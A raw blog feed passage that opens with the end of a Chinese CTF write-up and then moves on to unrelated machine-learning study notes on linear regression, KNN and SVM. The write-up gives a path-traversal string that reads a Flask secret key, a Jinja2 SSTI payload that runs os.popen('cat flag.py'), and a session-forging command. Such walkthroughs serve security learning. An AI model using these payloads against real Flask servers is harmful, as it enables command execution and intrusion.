</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="分析源码，确定漏洞利用"><a href="#分析源码，确定漏洞利用" class="headerlink" title="分析源码，确定漏洞利用"></a>分析源码，确定漏洞利用</h4><p>分析源码，可以知道：</p><p>1.文件夹有2个python文件 flag.py 和密钥文件 key.py。</p><p>2.不能直接访问 flag.py，这里任意文件读取过滤了flag关键词。</p><p>3.源码存在<strong>SSTI模板注入</strong></p><p>因为代码中有判断传入的session是否含n1code（ 这里可以理解为判断session的身份码），没有的话就创建这个session[‘n1code’]。</p><p>然后判断session[‘n1code’]是否为空，为空的的话就令 template（模板）为空，不为空的话就赋值 template 为一段实体编码过的HTML模板，并且**把session[‘n1code’]也带入到模板中渲染（渲染的代码会被执行，这里可以设计命令执行代码 )**。</p><p>也就是session中只要有n1code的内容，且不为空，就会被加入template模板中执行。这是只需在其中构造命令执行代码即可。</p><p>template解码后如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">template = &#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27; % session[&#x27;n1code&#x27;]</span><br></pre></td></tr></table></figure><h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p><strong>SSTI模板注入</strong></p><p>一般流程为：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;]</span><br></pre></td></tr></table></figure><p>说人话就是通过上面划线的语句，打开python命令执行的模块，这样我们的命令popen(&#39;cat flag.py&#39;).read()才能被执行。</p><p>（os.popen() 方法用于从获取一个命令的输出）。</p><p>因此payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;].popen(\&#x27;cat flag.py\&#x27;).read()&#125;&#125;&#x27;&#125;</span><br></pre></td></tr></table></figure><blockquote><h5 id="python-flask框架中的一些魔术方法"><a href="#python-flask框架中的一些魔术方法" class="headerlink" title="python flask框架中的一些魔术方法"></a>python flask框架中的一些魔术方法</h5><p><code>__class__</code> 返回类型所属的对象</p><p><code>__mro__</code> 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</p><p><code>__base__</code> 返回该对象所继承的基类 &#x2F;&#x2F;</p><p><code>__base__</code>和<code>__mro__</code>都是用来寻找基类的 <code>__subclasses__</code> 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</p><p><code>__init__</code> 类的初始化方法 <code>__globals__</code> 对包含函数全局变量的字典的引用</p></blockquote><p><strong>加密payload，写入session</strong>：</p><p>还有一个问题是这个payload无法直接写入cookie中的session，因为session还用了key.py进行加密。</p><p>所以查看key.py，得到加密的密钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?name=../../../proc/self/cwd/key.py</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812151727414.png" alt="image-20220812151727414"></p><p>然后使用工具 <strong>flask_session_cookie_manager3</strong>：</p><p><a href="https://codeload.github.com/noraj/flask-session-cookie-manager/zip/refs/heads/master">https://codeload.github.com/noraj/flask-session-cookie-manager/zip/refs/heads/master</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask_session_cookie_manager3.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;].popen(\&#x27;cat flag.py\&#x27;).read()&#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>加密结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.YZuIBg.eOXIyEYlDww9MHN2rJZpk13froc</span><br></pre></td></tr></table></figure><p>那么这个就是我们的身份码n1code+命令执行语句，作为session被模板渲染后执行，就能读取flag文件</p><h4 id="执行攻击，拿到flag"><a href="#执行攻击，拿到flag" class="headerlink" title="执行攻击，拿到flag"></a>执行攻击，拿到flag</h4><p>最后使用burp开始抓包，填入在cookie的session字段填入构造的payload：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220812152116080.png" alt="image-20220812152116080"></p><p>从回传的网页中得到flag。</p><h4 id="总结步骤-思路"><a href="#总结步骤-思路" class="headerlink" title="总结步骤(思路)"></a>总结步骤(思路)</h4><ol><li><p>利用linux下 &#x2F;porc目录下文件作用查看当前运行进程，得到server.py</p></li><li><p>分析server.py得知存在 key.py 和 flag.py（不可查取） ，且存在SSTI模板注入漏洞</p></li><li><p>构造模板注入语句，并使用flask_session_cookie_manager3.py脚本进行密钥加密</p></li><li><p>burp改包实现session伪造，命令执行。得到flag。</p></li></ol><p><strong>关于SSTI模板注入：</strong></p><p><a href="http://elssm.top/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/">http://elssm.top/2021/11/29/SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</a></p><p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p><p><strong>关于cookie、session、token：</strong></p><p><a href="https://blog.csdn.net/qq_40925189/article/details/107030620">https://blog.csdn.net/qq_40925189/article/details/107030620</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件读取&quot;&gt;&lt;a href=&quot;#文件读取&quot; class=&quot;headerlink&quot; title=&quot;文件读取&quot;&gt;&lt;/a&gt;文件读取&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>机器学习实战</title>
    <link href="https://frankcao3.github.io/posts/61497"/>
    <id>https://frankcao3.github.io/posts/61497</id>
    <published>2022-07-30T04:20:29.000Z</published>
    <updated>2023-10-06T09:09:05.971Z</updated>
    
    <content type="html"><![CDATA[<h1 id="机器学习实战"><a href="#机器学习实战" class="headerlink" title="机器学习实战"></a>机器学习实战</h1><p>参考书目：</p><p>《机器学习实战：基于Scikit-Learn和TensorFlow》</p><p>《机器学习实战》</p><h2 id="先导知识："><a href="#先导知识：" class="headerlink" title="先导知识："></a>先导知识：</h2><ol><li><p><strong>监督学习中，一般使用两种类型的目标变量，标称型和数值型。</strong></p><p>标称型目标变量的结果只在有限目标集中取值，如真与假、动物分类集合{ 爬行类、鱼类、哺乳类、两栖类、植物、真菌}；数值型目标变量则可以从无限的数值集合中取值，如0.100、42.001、1000.743 等。标称型目标变量主要用来分类，数值型目标变量主要用于回归分析。</p></li><li><p><strong>机器学习的主要任务：分类和回归。</strong></p><p>分类是将实例数据划分到合适的分类中，回归主要用于预测数值型数据。分类和回归均属于<strong>监督学习</strong>，即这类算法必须知道样本的类别，即目标变量的分类信息。另外，<strong>无监督学习</strong>则指训练数据没有类别信息，也不会给定目标值。无监督学习可以进行聚类、密度估计（寻找描述数据统计值），也可以减少数据特征的维度，以便使用二维或三维图形来更直观地展示数据信息。</p></li><li><p><strong>如何选择算法：</strong></p><p><em>（1）首先考虑使用算法的目的。</em></p><p>如果是想要知道数据的目标变量的值，可以选择监督学习算法。如果目标变量是离散的，就选择分类器算法；如果目标变量是连续的，就选择回归算法。</p><p>如果不想预测目标变量的值，可以选择无监督学习算法。如果是要将数据划分为离散的组，就选择聚类算法；如果需要估计数据与每个分组的相似程度，则需要使用密度估计算法。</p><p><em>（2）其次需要考虑数据问题。</em></p><p>特征值是离散型变量还是连续型，特征值中是否存在缺失的值，何种原因造成的缺失，数据中是否存在异常值，某个特征发生的频率如何等等。</p></li><li><p><strong>开发机器学习应用程序的步骤：</strong></p><p>（1）收集数据；</p><p>（2）准备输入数据；</p><p>（3）分析输入数据：查看数据中是否存在空值、异常值等，确保没有垃圾数据。</p><p>（4）训练算法；</p><p>（5）测试算法；</p><p>（6）使用算法。</p></li></ol><h2 id="第一章-线性模型"><a href="#第一章-线性模型" class="headerlink" title="第一章 线性模型"></a>第一章 线性模型</h2><h4 id="1-线性回归（回归）"><a href="#1-线性回归（回归）" class="headerlink" title="1. 线性回归（回归）"></a>1. 线性回归（回归）</h4><p>线性模型就是对输入特征加权求和，再加上一个我们称为偏置项（也称为截距项）的常数，以此进行预测。</p><p>由于线性回归模型的梯度下降对特征缩放敏感，所以需要保证所有特征值的大小比例都差不多（比如使用Scikit-Learn的StandardScaler类），否则收敛的时间会长很多。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"></span><br><span class="line">lin_reg = LinearRegression()</span><br><span class="line">lin_reg.fit(X, y)</span><br><span class="line"><span class="comment"># coef_存放回归系数，intercept_则存放截距</span></span><br><span class="line"><span class="built_in">print</span>(lin_reg.intercept_, lin_reg.coef_)</span><br><span class="line"><span class="built_in">print</span>(lin_reg.predict(X_new))</span><br></pre></td></tr></table></figure><p>其实大多数情况下不会使用纯线性回归，容易过拟合。通常会加上正则化（后面会讲到）。</p><p><u><em><strong>计算复杂度：</strong></em></u></p><p>特征数量比较大（例如100000）时，线性回归的计算将极其缓慢。但是另一方面，对于训练集中的实例数量来说，需要计算的方程是线性的，所以能够有效地处理大量的训练集，只要内存足够。在预测方面，线性回归模型一经训练（不论是标准方程还是梯度下降等其他算法），预测就非常快速：因为计算复杂度相对于想要预测的实例数量和特征数量来说，都是线性的。</p><h4 id="2-梯度下降"><a href="#2-梯度下降" class="headerlink" title="2. 梯度下降"></a>2. 梯度下降</h4><p><u><em><strong>标准方程：</strong></em></u></p><p>求线性模型的最优参数可以通过标准方程直接计算得到，但是涉及计算样本特征矩阵的内积，计算复杂度较高。但是优点是不需要特征缩放，不需要选择学习率以及进行迭代。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427104257714.png" alt="image-20210427104257714" style="zoom:50%;"><p><u><em><strong>梯度下降：</strong></em></u></p><p>梯度下降是一种非常通用的优化算法，能够为大范围的问题找到最优解。梯度下降的中心思想就是迭代地调整参数从而使成本函数最小化。</p><p>线性回归模型的成本函数恰好是个凸函数，所以在梯度下降时不会陷入局部最优。</p><p>应用梯度下降时，需要保证所有特征值的大小比例都差不多（比如使用Scikit-Learn的StandardScaler类），否则收敛的时间会长很多。</p><p><em><strong>批量梯度下降（BGD）：</strong></em></p><p>基于整个训练数据集对所有需要优化的参数进行同步优化。因此，<u>面对非常庞大的训练集时，算法会变得极慢</u>（不过我们即将看到快得多的梯度下降算法）。但是，梯度下降算法<u>随特征数量扩展的表现比较好</u>：如果要训练的线性模型拥有几十万个特征，使用梯度下降比标准方程要快得多。</p><p><strong>学习率</strong>控制了梯度下降的快慢，学习率太低，算法消耗时间太久，学习率太高，难以稳定到最优参数。要找到合适的学习率，可以使用网格搜索。</p><p>另外，参数优化的迭代次数也要适中，太低可能还未达到最优，太高浪费时间。一个简单的办法是，在开始时设置一个非常大的迭代次数，但是当梯度向量的值变得很微小时中断算法——也就是当它的范数变得低于（称为容差）时，因为这时梯度下降已经（几乎）到达了最小值。</p><p><em><strong>随机梯度下降（SGD）：</strong></em></p><p>批量梯度下降的主要问题是它要用整个训练集来计算每一步的梯度，所以训练集很大时，算法会特别慢。与之相反的极端是随机梯度下降，每一步在训练集中随机选择一个实例，并且仅<u>基于该单个实例来计算梯度</u>。这让算法变得快多了，也可以被用来训练海量的数据集。</p><p>另一方面，由于算法的随机性质，它比批量梯度下降要不规则得多。成本函数将不再是缓缓降低直到抵达最小值，而是不断上上下下，但是从整体来看，还是在慢慢下降。但是即使它到达了最小值，依旧还会持续反弹，永远不会停止。所以算法停下来的参数值肯定是足够好的，但不是最优的。</p><p>随机梯度下降其实可以<u>帮助算法跳出局部最小值</u>，所以相比批量梯度下降，它对找到全局最小值更有优势。因此，随机性的好处在于可以逃离局部最优，但缺点是<u>永远定位不出最小值</u>。要解决这个困境，有一个办法是<u>逐步降低学习率</u>（模拟退火）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 随机梯度下降，n_iter为迭代次数，penalty为惩罚项（正则化），eta0为迭代次数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line">sgd_reg = SGDRegressor(n_iter=<span class="number">50</span>, penalty=<span class="literal">None</span>, eta0=<span class="number">0.1</span>)</span><br><span class="line">sgd_reg.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(sgd_reg.intercept_, sgd_reg.coef_)</span><br></pre></td></tr></table></figure><p><strong>小批量梯度下降：</strong></p><p>每一步的梯度计算，基于一小部分随机的实例集也就是小批量。相比随机梯度下降，小批量梯度下降的主要优势在于可以从矩阵运算的硬件优化中获得显著的性能提升，特别是需要用到图形处理器时。</p><p>这个算法在参数空间层面的前进过程也不像SGD那样不稳定，特别是批量较大时。所以小批量梯度下降最终会比SGD更接近最小值一些。但是另一方面，它可能更难从局部最小值中逃脱</p><h4 id="3-多项式回归"><a href="#3-多项式回归" class="headerlink" title="3. 多项式回归"></a>3. 多项式回归</h4><p>当数据集并非线性时，可以将每个特征的幂次方添加为一个新特征，在拓展过的特征集上训练线性模型。这种方法被称为多项式回归。</p><p>PolynomialFeatures会在给定的多项式阶数下，添加所有特征组合。例如，有两个特征a和b，阶数degree&#x3D;3，PolynomialFeatures不只会添加特征a2、a3、b2和b3，还会添加组合ab、a2b以及ab2。</p><p>所以要小心特征组合的数量爆炸。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多项式回归，增加原特征的平方作为新特征</span></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> PolynomialFeatures</span><br><span class="line">poly_features = PolynomialFeatures(degree=<span class="number">2</span>, include_bias=<span class="literal">False</span>)</span><br><span class="line">X_poly = poly_features.fit_transform(X)</span><br><span class="line"><span class="comment"># X_poly现在包含原本的特征X和该特征的平方</span></span><br><span class="line">lin_reg = LinearRegression()</span><br><span class="line">lin_reg.fit(X_poly, y)</span><br><span class="line"><span class="built_in">print</span>(lin_reg.intercept_, lin_reg.coef_)</span><br></pre></td></tr></table></figure><p>或者使用管道技术一次完成：、</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">polynomial_regression = Pipeline([(<span class="string">&quot;poly_features&quot;</span>, PolynomialFeatures(degree=<span class="number">2</span>, include_bias=<span class="literal">False</span>)), (<span class="string">&quot;sgd_reg&quot;</span>, LinearRegression())])</span><br><span class="line">polynomial_regression.fit(X, y)</span><br></pre></td></tr></table></figure><h4 id="4-学习曲线"><a href="#4-学习曲线" class="headerlink" title="4. 学习曲线"></a>4. 学习曲线</h4><p>模型训练时会出现欠拟合和过拟合的问题。</p><p>如果无论怎么增大数据集，训练集和测试集的误差接近且较高，那么模型可能欠拟合。这时增大数据集是无效的，需要使用更复杂的模型和寻找更好的特征。</p><p>如果训练集和测试集的误差有一定差距，且在训练集上模型的表现好很多，那么说明模型过拟合了。这时需要增加训练数据，直到测试误差接近训练误差。或者对模型进行正则化。</p><h4 id="5-正则线性模型"><a href="#5-正则线性模型" class="headerlink" title="5. 正则线性模型"></a>5. 正则线性模型</h4><p>减少过度拟合的一个好办法就是对模型正则化（即约束它）：它拥有的自由度越低，就越不容易过度拟合数据。</p><p>比如对于多项式模型来说，正则化可以是降低多项式的阶数。对于线性模型，正则化通常通过约束模型的权重来实现。</p><p><u><em><strong>岭回归（Ridge Regression）：</strong></em></u></p><p>在成本函数中添加一个正则项，使得学习中的算法不仅需要拟合数据，同时还要让模型权重保持最小。</p><p>在执行岭回归之前，必须对数据进行缩放（例如使用StandardScaler），因为它对输入特征的大小非常敏感。大多数正则化模型都是如此。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427164855903.png" alt="image-20210427164855903" style="zoom:50%;"><p>超参数α控制的是对模型进行正则化的程度。如果α&#x3D;0，则岭回归就是线性模型。如果α非常大，那么所有的权重都将非常接近于零，结果是一条穿过数据平均值的水平线。</p><p>注意，正则项<u>只能在训练的时候添加到成本函数中</u>，一旦训练完成，你需要使用未经正则化的性能指标来评估模型性能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用标准方程求解的岭回归</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line">ridge_reg = Ridge(alpha=<span class="number">1</span>, solver=<span class="string">&quot;cholesky&quot;</span>)</span><br><span class="line">ridge_reg.fit(X, y)</span><br><span class="line">ridge_reg.predict([[<span class="number">1.5</span>]])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用梯度下降的岭回归,正则项为l2表示岭回归</span></span><br><span class="line">sgd_reg = SGDRegressor(penalty=<span class="string">&quot;l2&quot;</span>)</span><br><span class="line">sgd_reg.fit(X, y.ravel())</span><br><span class="line"><span class="built_in">print</span>(sgd_reg.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p>超参数penalty设置的是使用正则项的类型。设为”l2”表示希望SGD在成本函数中添加一个正则项，等于权重向量的l2范数的平方的一半，即岭回归。</p><p><u><em><strong>套索回归（Lasso Regression）：</strong></em></u></p><p>与岭回归一样，它也是向成本函数增加一个正则项，但是它增加的是权重向量的l1范数，而不是l2范数的平方的一半。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427183920256.png" alt="image-20210427183920256" style="zoom: 33%;"><p>Lasso回归的一个重要特点是它倾向于完全消除掉最不重要特征的权重（也就是将它们设置为零）。也就是说，Lasso回归会自动执行特征选择并输出一个稀疏模型（即只有很少的特征有非零权重）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用Lasso回归</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line">lasso_reg = Lasso(alpha=<span class="number">0.1</span>)</span><br><span class="line">lasso_reg.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(lasso_reg.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>弹性网络（Elastic Net）：</strong></em></u></p><p>弹性网络是岭回归与Lasso回归之间的中间地带。其正则项就是岭回归和Lasso回归的正则项的混合，混合比例通过r来控制。当r＝0时，弹性网络即等同于岭回归，而当r＝1时，即相当于Lasso回归。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427204356724.png" alt="image-20210427204356724" style="zoom:50%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用弹性网络</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet</span><br><span class="line">elastic_net = ElasticNet(alpha=<span class="number">0.1</span>, l1_ratio=<span class="number">0.5</span>)</span><br><span class="line">elastic_net.fit(X, y)</span><br><span class="line"><span class="built_in">print</span>(elastic_net.predict([[<span class="number">1.5</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>如何选择正则化模型：</strong></em></u></p><p>模型正则化比不正则化可取。大多数情况下，应该避免使用纯线性回归。</p><p>岭回归是个不错的默认选择，但是如果你觉得实际用到的特征只有少数几个，那就应该更倾向于Lasso回归或是弹性网络，因为它们会将无用特征的权重降为零。</p><p>一般而言，弹性网络优于Lasso回归，因为当特征数量超过训练实例数量，又或者是几个特征强相关时，Lasso回归的表现可能非常不稳定。</p><h4 id="6-逻辑回归（分类）"><a href="#6-逻辑回归（分类）" class="headerlink" title="6. 逻辑回归（分类）"></a>6. 逻辑回归（分类）</h4><p>将数据正则化之后，比如使用StandardScaler类，使用LogisticRegression类进行模型建立。逻辑回归被广泛用于估算一个实例属于某个特定类别的概率。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427232532919.png" alt="image-20210427232532919"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"></span><br><span class="line">log_reg = LogisticRegression(C=<span class="number">1e5</span>)</span><br><span class="line">log_reg.fit(x_train, y_train)</span><br><span class="line">pre_pro = log_reg.predict_proba(x_test)</span><br></pre></td></tr></table></figure><p>如果你要求它预测出类别（使用predict（）方法而不是predict_proba（）方法），它将返回一个可能性最大的类别。</p><p>与其他线性模型一样，逻辑回归模型可以用l1或l2惩罚函数来正则化。Scikit-Learn默认添加的是l2函数。</p><p>控制Scikit-Learn的LogisticRegression模型正则化程度的超参数不是alpha（其他线性模型使用alpha），而是它的逆反：C，<u>C的值越高，模型正则化程度越高。</u></p><p><u><em><strong>Softmax回归:</strong></em></u></p><p>逻辑回归模型经过推广，可以直接支持多个类别，而不需要训练并组合多个二元分类器（如第3章所述）。这就是Softmax回归。</p><p>原理很简单：对于一个给定的实例x，Softmax回归模型首先计算出每个类别k的分数sk（x），然后对这些分数应用softmax函数（也叫归一化指数），估算出每个类别的概率。跟逻辑回归分类器一样，Softmax回归分类器将估算概率值最高的类别作为预测类别（也就是分数最高的类别）。</p><p>Softmax回归分类器一次只会预测一个类别（也就是说，它是多类别，但是不是多输出），所以它应该仅适用于互斥的类别之上。</p><p>Softmax回归的训练目标是得到一个能对目标类别做出高概率估算的模型（也就是其他类别的概率相应要很低），其成本函数（交叉熵）如下：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427232025182.png" alt="image-20210427232025182" style="zoom:67%;"><p>当只有两个类别（K&#x3D;2）时，该成本函数等价于逻辑回归的成本函数（log损失函数）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">softmax_reg = LogisticRegression(multi_class=<span class="string">&quot;multinomial&quot;</span>,solver=<span class="string">&quot;lbfgs&quot;</span>, C=<span class="number">10</span>)</span><br><span class="line">softmax_reg.fit(X, y)</span><br><span class="line">softmax_reg.predict([[<span class="number">5</span>, <span class="number">2</span>]])</span><br></pre></td></tr></table></figure><h2 id="第二章-KNN算法"><a href="#第二章-KNN算法" class="headerlink" title="第二章 KNN算法"></a>第二章 KNN算法</h2><p><strong>优点</strong>：精度高，对异常值不敏感，无数据输入假定。</p><p><strong>缺点</strong>：计算复杂度高、空间复杂度高。</p><p><strong>适用范围</strong>：数值型和标称型。</p><p>对未知类别属性的数据集中的每个点依次执行以下操作：<br>(1)  计算已知类别数据集中的点与当前点之间的距离（欧氏距离）；<br>(2)  按照距离递增次序排序；<br>(3)  选取与当前点距离最小的<strong>k</strong>个点；<br>(4)  确定前<strong>k</strong>个点所在类别的出现频率；<br>(5)  返回前<strong>k</strong>个点出现频率最高的类别作为当前点的预测分类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">3</span>)</span><br><span class="line"><span class="comment"># 6折交叉验证</span></span><br><span class="line">scores = cross_val_score(knn, x, y, cv=<span class="number">6</span>, scoring=<span class="string">&#x27;accuracy&#x27;</span>)</span><br></pre></td></tr></table></figure><p>当然，KNN也可以用来处理回归任务。返回邻近的K个样本点的标签值的平均数作为预测值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理回归任务</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line">knn_clf = KNeighborsRegressor(n_neighbors=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="第三章-SVM算法"><a href="#第三章-SVM算法" class="headerlink" title="第三章 SVM算法"></a>第三章 SVM算法</h2><p>能够执行线性或非线性分类、回归，甚至是异常值检测任务。它是机器学习领域最受欢迎的模型之一，特别适用于中小型复杂数据集的分类。</p><p><u><em><strong>优点：</strong></em></u></p><ol><li>用于二元和多元分类器、回归和新奇性检测</li><li>良好的预测生成器，提供了鲁棒的过拟合、噪声数据和异常点处理</li><li>当变量比样本还多是依旧有效</li><li>快速，即使样本量大于1万</li><li>自动检测数据的非线性，不用做变量变换</li></ol><p><u><em><strong>缺点：</strong></em></u></p><ol><li>应用在二元分类表现最好，其他预测问题表现不是太好</li><li>变量比样例多很多的时候，有效性降低，需要使用其他方案，例如SGD方案</li><li>只提供预测结果，如果想要获取预测概率，需要额外方法去获取</li><li>如果想要最优结果，需要调参。</li></ol><p><u><em><strong>使用SVM预测模型的通用步骤：</strong></em></u></p><ol><li>选择使用的SVM类</li><li>用数据训练模型</li><li>检查验证误差并作为基准线</li><li>为SVM参数尝试不同的值</li><li>检查验证误差是否改进</li><li>再次使用最优参数的数据来训练模型</li></ol><h4 id="1-线性SVM分类"><a href="#1-线性SVM分类" class="headerlink" title="1. 线性SVM分类"></a>1. 线性SVM分类</h4><p>生成决策边界（实线所示），不仅分离类别，并且尽可能远离最近的训练实例（大间隔分类）。决策边界由最接近边界的训练实例确定（支持），这些实例被称为支持向量（下图中已圈出）。</p><p>可以将SVM分类器视为在类别之间拟合可能的最宽的”街道“（平行的虚线所示）。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423214002939.png" alt="image-20210423214002939"></p><p>SVM对<strong>特征缩放</strong>非常敏感，在垂直刻度和水平刻度上生成的决策边界可能存在很大的差异。在左图中，垂直刻度（0<del>90）比水平刻度（0</del>6）大得多，因此可能的决策边界接近于水平。在特征缩放（例如使用Scikit-Learn的StandardScaler）后，决策边界看起来好很多（见右图）。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423214542324.png" 